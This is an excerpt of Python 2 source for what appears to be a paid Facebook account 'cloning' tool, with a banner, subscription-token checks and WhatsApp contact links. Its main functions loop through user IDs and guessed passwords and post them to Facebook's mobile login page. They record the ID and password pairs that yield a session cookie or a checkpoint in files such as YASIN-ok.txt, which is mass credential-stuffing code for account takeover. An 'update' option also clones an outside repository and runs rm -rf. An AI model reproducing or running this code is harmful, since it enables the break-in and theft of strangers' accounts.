...
logo = "\n\033[1;91m  _____  _    _     _   _    _     __  __\033[1;91m\n |_   _|/ \  | |   | | | |  / \    \ \/ /\033[1;92m\n   | | / _ \ | |   | |_| | / _ \    \  / \033[1;93m\n   | |/ ___ \| |___|  _  |/ ___ \   /  \ \033[1;91m\n   |_/_/   \_\_____|_| |_/_/   \_\ /_/\_\\\n\033[1;97m-----------------------------------------------\t\n'\x1b[1;92m'\x1b[1;97m[\033[1;91m<\033[1;92m>\033[1;97m] Author    :    THEORY        \n'\x1b[1;91m'\x1b[1;97m[\033[1;91m<\033[1;92m>\033[1;97m] \x1b[1;92mFacebook  :    Helin     \n'\x1b[1;96m'\x1b[1;97m[\033[1;91m<\033[1;92m>\033[1;97m] \x1b[1;91mWhatsApp  :    +923404708884     \n'\x1b[1;93m'\x1b[1;97m[\033[1;92m<\033[1;91m>\033[1;97m] \x1b[1;96mGitHub    :    YOUNIS-XXX-2005\n'\x1b[1;91m'\x1b[1;97m[\033[1;92m<\033[1;91m>\033[1;97m] \x1b[1;93mYouTube   :    Tech By Younis           \n\x1b[1;96m' \x1b[1;97m[\033[1;91m<\033[1;92m>\033[1;97m] \x1b[1;97mVersion   :    XXX - 4\n\x1b[1;97m-----------------------------------------------"
dec = '2'
server = '2'
...
def main_apv():
    ...
    try:
        ...
        os.system('clear')
        print logo
        print '\x1b[1;97m[\033[1;92m<\033[1;91m>\033[1;97m]                \x1b[1;92mTHIS  TOOL IS PAID'
        ...
        kok.write(myid + imt)
        kok.close()
        print'            \033[1;92mTHIS  TOOL IS PAID'
        print '           You dont have subscrption'
        print '[#] First Copy Your Token And Pree Enter'
        print ' And Go To Admin WhatsApp'
        print 'Send Your Token Get Subscription'
        print ''
        print ''
        print ''
        raw_input('\x1b[1;97m[\033[1;92m<\033[1;91m>\033[1;97m] \x1b[1;93m PRESS ENTER :)')
        os.system('xdg-open https://wa.me/+923404708884')

    r1 = requests.get('https://raw.githubusercontent.com/YOUNIS-2005/APVXX-XX/main/XXXXXXXXXXX').text
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
        print logo
        print'\t [\x1b[1;97m\x1b[1;41m THIS  TOOL IS PAID \x1b[0m\x1b[1;97m]'
        print "\x1b[1;97m[\033[1;91m<>\033[1;97m] \033[1;92mYOUR TOKEN NOT APPROVED ALREADY !"
        print ''
        print '\x1b[1;97m[\033[1;92m<\033[1;91m>\033[1;97m] \033[1;97mFirst Copy Your Token And Pree Enter'
        print '     And Go To Admin WhatsApp'
        print'     Send Your Token Get Subscription'
        print''
        print'\033[1;92m-----------------------------------------------'
        print '\x1b[1;97m[\033[1;92m<\033[1;91m>\033[1;97m] \033[1;93mYOUR TOKEN:   ' + key1
        print'\033[1;92m-----------------------------------------------'
        print ''
        raw_input('\x1b[1;97m[\033[1;92m<\033[1;91m>\033[1;97m] \x1b[1;93mCOPY YOUR TOKEN && PRESS ENTER :)')
        os.system('xdg-open https://wa.me/+8801301390309')
...
def main_system():
    ...
    print '\x1b[1;97m[5] Check Subscription '
    print '\x1b[1;96m[6] Update Tools'
    print '\x1b[1;92m[7] For Any Help Massage WhatsApp'
    print 47 * '\x1b[1;97m~'
    main_input()
...
def main_input():
    ...
    if mx == '1':
        ...
        print '        Member In Paid Commands '
        print '        ENJOY  KRO BHI LOGO '
        time.sleep(3.5)
        main_system()
    elif mx == '6':
        os.system('git clone https://github.com/cyberxyasin404')
        os.system('rm -rf YASIN-XD')
        os.system('cp -f YASIN-XD/YASIN-XD \\.')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[YASIN-OK] ' + coc + user + ' | ' + pass1
                ok = open('YASIN-ok.txt', 'a')
                ok.write(cid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(cid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[YASIN-CP] ' + coc + user + ' | ' + pass1
                cp = open('YASIN random-co.txt', 'a')
                cp.write(cid + ' | ' + pass1 + '\n')
                cp.close()
...
def fb_menu():
    ...
    print ''
    print 39 * '-'
    print '\x1b[1;92m[1] Public Cloning  [THEORYPro]'
    print '\x1b[1;92m[2] Public Cloning  [THEORY Fast]'
    print '\x1b[1;91m[0] Back '
    print 39 * '-'
    cz = raw_input('[!] Select : ')
    if cz == '1':
        print ''
        print '\x1b[1;91m      [ Public Cloning THEORY Pro ]'
        print ''
        ...
        print ''
        print '\x1b[1;92m      [ Public Cloning THEORYFast ]'
        print ''
...
def mineExt():
    ...
    print g + '[=] Extracting From YASIN : ' + my_line[:15]
...
def xokpauto():
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[YASIN-OK] ' + uid + ' | ' + pass1
                ok = open('yasin-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;97m[YASIN-CP] ' + uid + ' | ' + pass1
                cp = open('yasin-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[YASIN-OK] ' + uid + ' | ' + pass2
                    ok = open('YASIN-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;97m[YASIN-CP] ' + uid + ' | ' + pass2
                    cp = open('YASIN-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[THEORY-OK] ' + uid + ' | ' + pass3
                        ok = open('YASIN-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;97m[THEORY-CP] ' + uid + ' | ' + pass3
                        cp = open('txtYASIN-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[YASIN-OK] ' + uid + ' | ' + pass4
                            ok = open('YASIN-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;97m[YASIN-CP] ' + uid + ' | ' + pass4
                            cp = open('YASIN-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[THEORY-OK] ' + uid + ' | ' + pass5
                                ok = open('YASIN-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;97m[THEORY-CP] ' + uid + ' | ' + pass5
                                cp = open('YASIN-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
...
def xokp():
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[THEORY-OK] ' + uid + ' | ' + pass1
                ok = open('YASIN-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;97m[THEORY-CP] ' + uid + ' | ' + pass1
                cp = open('YASIN-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass2, 'login': 'submit'})
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[THEORY-OK] ' + uid + ' | ' + pass2
                    ok = open('YASIN-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;97m[THEORY-CP] ' + uid + ' | ' + pass2
                    cp = open('YASIN-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                    ...
                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass3, 'login': 'submit'})
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[YASIN-OK] ' + uid + ' | ' + pass3
                        ok = open('YASIN-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;97m[YASIN-CP] ' + uid + ' | ' + pass3
                        cp = open('YASIN-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                        ...
                        b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass4, 'login': 'submit'})
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[THEORY-OK] ' + uid + ' | ' + pass4
                            ok = open('YASIN-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;97m[THEORY-CP] ' + uid + ' | ' + pass4
                            cp = open('YASIN-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass5, 'login': 'submit'})
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[YASIN-OK] ' + uid + ' | ' + pass5
                                ok = open('YASIN-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;97m[YASIN-CP] ' + uid + ' | ' + pass5
                                cp = open('YASIN-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[YASIN-OK] ' + uid + ' | ' + pass6
                                    ok = open('YASIN-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;97m[YASIN-CP] ' + uid + ' | ' + pass6
                                    cp = open('YASIN-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
